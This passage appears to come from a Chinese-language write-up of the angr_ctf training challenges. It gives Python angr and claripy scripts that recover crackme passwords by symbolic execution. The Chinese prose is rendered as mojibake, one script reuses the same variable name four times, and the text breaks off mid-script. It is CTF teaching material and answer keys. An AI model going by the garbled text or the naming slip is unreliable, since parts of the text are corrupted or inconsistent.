åˆ›å»ºå¸¦æœ‰å…·ä½“å€¼ï¼ˆconcrete valueï¼‰çš„æŒ‡å®šé•¿åº¦çš„ä½å‘é‡å€¼ï¼ˆbitvector valueï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv<br>&lt;BV64 <span class="hljs-number">0x617274746e626133</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2<br>&lt;BV32 <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>ç›¸åŒé•¿åº¦çš„ä½å‘é‡å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œå¯¹äºä¸åŒé•¿åº¦çš„ä½å‘é‡åˆ™å¯ä»¥é€šè¿‡ <code>.zero_extend(extended_bits)</code> å®Œæˆä½æ‰©å±•ï¼ˆ0å¡«å……ï¼‰åè¿›è¡Œè¿ç®—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä½å‘é‡çš„è¿ç®—åŒæ ·å­˜åœ¨æº¢å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv + bvv2<br>&lt;BV64 <span class="hljs-number">0x617274754d102022</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv * bvv<br>&lt;BV64 <span class="hljs-number">0x9842ff8e63f3b029</span>&gt;<br></code></pre></td></tr></table></figure><p>ä½å‘é‡é™¤äº†ä»£è¡¨å…·ä½“å€¼ï¼ˆconcrete valueï¼‰çš„ <code>bitvector value</code> ä»¥å¤–ï¼Œè¿˜æœ‰ä»£è¡¨<strong>ç¬¦å·å˜é‡</strong>ï¼ˆsymbolic variableï¼‰çš„ <code>bitvector symbol</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>claripy.BVS(name, size_in_bits)</code> åˆ›å»ºå¸¦åå­—çš„æŒ‡å®šé•¿åº¦çš„ä½å‘é‡ç¬¦å·ï¼ˆbitvector symbolï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs<br>&lt;BV64 x_0_64&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2<br>&lt;BV64 y_1_64&gt;<br></code></pre></td></tr></table></figure><p>ä½å‘é‡ç¬¦å·ä¸ä½å‘é‡å€¼ä¹‹é—´åŒæ„å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œç»„åˆæˆæ›´åŠ å¤æ‚çš„è¡¨è¾¾å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3<br>&lt;BV64 (x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>) / x_0_64&gt;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>.op</code> ä¸ <code>.args</code> è·å¾—ä½å‘é‡çš„è¿ç®—ç±»å‹ä¸å‚æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.op<br><span class="hljs-string">&#x27;BVV&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs.op<br><span class="hljs-string">&#x27;BVS&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.op<br><span class="hljs-string">&#x27;__floordiv__&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.args<br>(&lt;BV64 x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.args<br>(<span class="hljs-number">7021802812440994099</span>, <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><h3 id="state-solver-çŠ¶æ€çš„æ±‚è§£æ¥å£">state.solver - çŠ¶æ€çš„æ±‚è§£æ¥å£</h3><p>å‰é¢è®²åˆ° <code>state.solver</code> æä¾›äº†ä¸€äº›åŸºäºçŠ¶æ€çš„æ±‚è§£æ¥å£ï¼Œä¾‹å¦‚ solver åŒæ ·æœ‰åˆ›å»ºä½å‘é‡çš„ <code>.BVV()</code> ä¸ <code>.BVS()</code> æ¥å£</p><p>åœ¨éœ€è¦å¯¹ä½å‘é‡ç¬¦å·è¿›è¡Œå…·ä½“å€¼çš„æ±‚è§£æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†ä½å‘é‡ç¬¦å·å­˜æ”¾åˆ°çŠ¶æ€çš„å†…å­˜/å¯„å­˜å™¨ä¸­ï¼Œä¹‹åç”¨ simgr æ¢ç´¢åˆ°å¯¹åº”çš„çŠ¶æ€åï¼Œå†ä½¿ç”¨ <code>state.solver.eval()</code> æˆå‘˜å‡½æ•°æ¥è·å–å¯¹åº”ä½å‘é‡åœ¨å½“å‰çŠ¶æ€ä¸‹çš„å€¼ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ğŸŒ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bvs_to_solve = claripy.BVS(<span class="hljs-string">&#x27;bvs_to_solve&#x27;</span>, <span class="hljs-number">64</span>)<br>init_state = proj.factory.entry_state()<br>init_state.memory.store(<span class="hljs-number">0xdeadbeef</span>, bvs_to_solve)<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = <span class="hljs-number">0xbeefdead</span>)<br><br>solver_state = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(solver_state.solver.<span class="hljs-built_in">eval</span>(bvs_to_solve))<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-2">FINAL EXPLOIT</h3><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€ä¸ªä» <code>get_user_input()</code> ä¹‹åå¼€å§‹æ‰§è¡Œçš„ç©ºç™½çš„çŠ¶æ€ï¼Œå¹¶å°†å¯¹åº”çš„å¯„å­˜å™¨è®¾ç½®ä¸ºä½å‘é‡ç¬¦å·ï¼Œä¹‹ååœ¨æ±‚è§£çŠ¶æ€ä½¿ç”¨ <code>.solver.eval()</code> æ¥æ±‚è§£å³å¯</p><p>æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./03_angr_symbolic_registers&#x27;</span><br>    proj = angr.Project(bin_path)<br>    <span class="hljs-comment"># blank_state() means creating an empty state and set the current PC to specific addr</span><br>    start_addr = <span class="hljs-number">0x8049670</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create  symbolic variables with claripy.BVS(name, size), size is counted by bits</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_1&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_2&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    <br>    <span class="hljs-comment"># set the init_state&#x27;s register to corresponding symbolic variables</span><br>    init_state.regs.eax = password_0<br>    init_state.regs.ebx = password_1<br>    init_state.regs.edx = password_2<br>    <br>    <span class="hljs-comment"># now solve it!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># we use state.solver.eval(BVS) to get the answer value there</span><br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_0)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_1)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_2)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>å¾ˆå¿«å•Šï¼Œå•ªçš„ä¸€ä¸‹å°±å‡ºæ¥äº†.mkv</p><p><img src="https://s2.loli.net/2022/10/31/MkU5bdLO4js6ZXy.png" alt="image.png"></p><h2 id="04-angr-symbolic-stackï¼šç¬¦å·åŒ–æ ˆ">04_angr_symbolic_stackï¼šç¬¦å·åŒ–æ ˆ</h2><p>è¿˜æ˜¯æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œä¸»è¦çš„å¤„ç†é€»è¾‘åœ¨ <code>handle_user()</code> å½“ä¸­ï¼Œè¿˜æ˜¯è¯»å…¥ä¸¤ä¸ªæ•°ä¹‹åæ‰”ç»™ä¸åŒçš„ complex å‡½æ•°å¤„ç†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/TZrWvDe5iq3R1E7.png" alt="image.png"></p><p>ç„¶åä½ ä¼šå‘ç°ç”¨ä¸Šä¸Šé¢˜çš„è„šæœ¬ä¹Ÿèƒ½ç§’è§£â€¦ä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p><p>é‡æ–°è¯»ä¸€ä¸‹é¢˜ç›®â€”â€”<code>symbolic stack</code>ï¼Œè¿™æ„å‘³ç€<strong>æœ¬é¢˜æˆ‘ä»¬åº”å½“å°†æ ˆè®¾ç½®ä¸ºç¬¦å·å˜é‡æ¥è¿›è¡Œçº¦æŸæ±‚è§£</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿé‡æ–°æ¥çœ‹ <code>handler_user()</code> çš„æ±‡ç¼–ä»£ç ï¼Œä¸¤ä¸ªå¾…æ±‚è§£å˜é‡éƒ½æ˜¯ä½äºæ ˆä¸Šçš„å›ºå®šä½ç½®ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/ihsBNwyqpUJrneg.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥å°†åˆå§‹çŠ¶æ€è®¾ç½®ä¸ºä»è¯»å…¥è¾“å…¥åå¼€å§‹çš„ç©ºç™½çŠ¶æ€ï¼Œä¹‹ååˆ›å»ºä¸¤ä¸ªä½å‘é‡ç¬¦å·ï¼Œè®¾ç½®å¥½ ebp å’Œ esp çš„ç›¸å¯¹ä½ç½®åä½¿ç”¨  <code>state.stack_push(val)</code> æ¥<strong>æ‰‹åŠ¨åœ°å°†ç¬¦å·å˜é‡æ¨åˆ°æ ˆä¸Š</strong>ï¼Œæœ€åçš„æ±‚è§£è·¯å¾„è¿˜æ˜¯è®¾ä¸ºè¾“å‡º <code>&quot;Good Job.&quot;</code> çš„åœ°å€å³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä»”ç»†è®¡ç®—å˜é‡åœ¨æ ˆä¸Šçš„ä½ç½®</p><p>æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import sys<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./04_angr_symbolic_stack&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x80493EF # first insn after `call scanf`<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # create symbolic variables<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 32) # 32-bit integer<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 32) # 32-bit integer<br>    <br>    # set the context<br>    init_state.regs.ebp = init_state.regs.esp<br>    ## first val is on [ebp - 0xC], so we need to `sub esp` so that we can push properly<br>    init_state.regs.esp -= 0x8<br>    ## these two variables are continuous on the stack<br>    init_state.stack_push(password_0)<br>    init_state.stack_push(password_1)<br>    ## the relative position of esp when return from scanf()<br>    ## seems that it&#x27;s okay to not do it?<br>    init_state.regs.esp -= 12<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x804943C, avoid = 0x804942A)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0)<br>        solution_1 = solution_state.solver.eval(password_1)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/e7sESMFHzIxb26X.png" alt="image.png"></p><h2 id="05-angr-symbolic-memoryï¼šç¬¦å·åŒ–å†…å­˜">05_angr_symbolic_memoryï¼šç¬¦å·åŒ–å†…å­˜</h2><p>è¿˜æ˜¯æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œè¿™ä¸€æ¬¡æ˜¯è¯»å…¥å››ä¸ª 8 å­—èŠ‚åˆ°ä¸€å—è¿ç»­çš„ 32 å­—èŠ‚å†…å­˜ä¸Šï¼Œå…¶ä¸­ <code>user_input</code> çš„åœ°å€ä¾¿æ˜¯ <code>0x82F48A0</code>ï¼Œä¹‹åè°ƒç”¨ <code>complex_function()</code> é€å­—ç¬¦å¤„ç†è¿™ 32 å­—èŠ‚åä¸ç‰¹å®šå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/ZhNrVoe3gK9G5PJ.png" alt="image.png"></p><p>é‚£ä¹ˆä»é¢˜ç›®åç§°æˆ‘ä»¬ä¸éš¾çœ‹å‡º<strong>è¿™ä¸€æ¬¡æˆ‘ä»¬åº”å½“è¦å°†å†…å­˜ä½œä¸ºç¬¦å·å˜é‡è¿›è¡Œçº¦æŸæ±‚è§£</strong></p><h3 id="state-çš„å†…å­˜æ“ä½œ">state çš„å†…å­˜æ“ä½œ</h3><p>å‰é¢è®²åˆ°ï¼Œå¯¹äºä¸€ä¸ªçŠ¶æ€çš„å†…å­˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>state.memory</code> çš„å¯¹åº”æ¥å£è¿›è¡Œæ“ä½œï¼š</p><ul><li><code>state.memory.load(addr, size_in_bytes)</code> ï¼šè·å–è¯¥åœ°å€ä¸ŠæŒ‡å®šå¤§å°çš„ä½å‘é‡</li><li><code>state.memory.store(addr, bitvector)</code> ï¼šå°†ä¸€ä¸ªä½å‘é‡å­˜å‚¨åˆ°æŒ‡å®šåœ°å€</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœè¦å‚¨å­˜å…·ä½“å€¼ï¼Œåˆ™éœ€è¦é€šè¿‡ <code>endness</code> å‚æ•°æŒ‡å®šå¤§å°ç«¯åº</p><h3 id="FINAL-EXPLOIT-3">FINAL EXPLOIT</h3><p>é‚£ä¹ˆæœ¬é¢˜è¿˜æ˜¯åˆ›å»ºå¯¹åº”å¤§å°çš„ BVS å explore() å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨è·å–æœ€åæ±‚è§£çš„å€¼æ—¶åˆ«å¿˜äº†æŒ‡å®šå‚æ•° <code>cast_to=bytes</code> ä»¥è·å¾—å­—ç¬¦è¾“å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./05_angr_symbolic_memory&#x27;</span><br>    proj = angr.Project(bin_path)<br>    start_addr = <span class="hljs-number">0x8049315</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create symbolic variables</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_3 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    <br>    <span class="hljs-comment"># insert the symbolic vals into memory</span><br>    init_state.memory.store(<span class="hljs-number">0x82F48A0</span>, password_0)<br>    init_state.memory.store(<span class="hljs-number">0x82F48A8</span>, password_1)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B0</span>, password_2)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B8</span>, password_3)<br>    <br>    <span class="hljs-comment"># now to solve!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x8049381</span>, avoid = <span class="hljs-number">0x804936F</span>)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_3 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_3, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_3: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_3))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡çš„æ±‚è§£éœ€è¦ä¸€ç‚¹ç‚¹æ—¶é—´ï¼Œä»¥åŠä¸€å®šé‡çš„å†…å­˜ï¼ˆç¬”è€…ä»… 2G å†…å­˜çš„é˜¿é‡Œäº‘å­¦ç”Ÿæœºåœ¨è·‘è§£é¢˜è„šæœ¬æ—¶å°±è¢« Kill äº†å‡ æ¬¡ï¼Œæœ€åä¸å¾—ä¸ç”¨ä¸€äº›æ–¹æ³•è…¾ä¸€äº›å†…å­˜åæ‰æå®š</p><p><img src="https://s2.loli.net/2022/10/31/5Mymf9v8dTKUFWu.png" alt="image.png"></p><h2 id="06-angr-symbolic-dynamic-memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜">06_angr_symbolic_dynamic_memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œè¿˜æ˜¯æƒ¯ä¾‹åœ°è¯»å…¥è¾“å…¥å complex å¤„ç†åè¿›è¡Œå¯¹æ¯”ï¼Œä¸è¿‡ä¸ä¸€æ ·çš„æ˜¯æœ¬é¢˜å­˜å‚¨è¾“å…¥ä½¿ç”¨çš„æ˜¯<strong>åŠ¨æ€åˆ†é…çš„å†…å­˜</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/dQEJzTtXKWZaPLV.png" alt="image.png"></p><p>é‚£ä¹ˆæ€ä¹ˆå¤„ç†å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä»å‚¨å­˜è¿™ä¸¤å—å†…å­˜çš„æŒ‡é’ˆçš„åœ°å€å…¥æ‰‹ï¼Œæ³¨æ„åˆ°ä¸¤ä¸ªæŒ‡é’ˆ <code>buffer0</code> ä¸ <code>buffer1</code> æ˜¯ä¸¤ä¸ªå…¨å±€å˜é‡ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/XkKs9MjUmh2yGbw.png" alt="image.png"></p><ul><li>å°†åˆå§‹çŠ¶æ€è®¾ä¸º<strong>è¯»å–å®Œè¾“å…¥åçš„çŠ¶æ€</strong></li><li>ä»»æ„é€‰ä¸¤ä¸ªåœ°å€ä½œä¸º fake chunk çš„åœ°å€ï¼Œå¹¶å°†è¿™ä¸¤ä¸ª buffer æŒ‡é’ˆæŒ‡å‘ fake chunk</li><li>å†åœ¨ fake chunk å†…å­˜ä¸Šæ”¾ç½®ç›¸åº”çš„å†…å­˜ç¬¦å·å˜é‡è¿›è¡Œæ±‚è§£å³å¯</li></ul><p>å› ä¸ºç¬¦å·æ‰§è¡Œä¸ä¼šå®é™…æ‰§è¡Œç¨‹åºï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä»»æ„è®¾ç½® fake chunk åœ°å€å¹¶ä¸ä¼šå¯¼è‡´ segmentation fault çš„å‘ç”Ÿï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å¯¹äºå…·ä½“çš„å€¼è€Œè¨€æˆ‘ä»¬åˆ«å¿˜äº†é€šè¿‡ <code>endness</code> å‚æ•°æŒ‡å®šå¤§å°ç«¯åº</p><p>äºæ˜¯æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./06_angr_symbolic_dynamic_memory&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 